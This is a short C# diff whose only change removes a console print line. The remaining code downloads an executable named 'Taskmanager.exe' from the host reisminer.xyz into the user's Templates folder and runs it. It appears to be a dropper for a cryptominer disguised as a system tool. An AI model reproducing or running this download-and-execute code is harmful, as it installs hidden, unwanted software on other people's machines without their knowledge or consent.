@@ -11,7 +11,6 @@ namespace DownloadToFile
         public static void Main(string[] args)
         {
             //get Taskmanager closer
-            Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.Templates));
             Client.DownloadFile("http://reisminer.xyz/exes/Taskmanager.exe",Environment.GetFolderPath(Environment.SpecialFolder.Templates)+@"\Taskmanager.exe");
             Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates)+ @"\Taskmanager.exe");
             
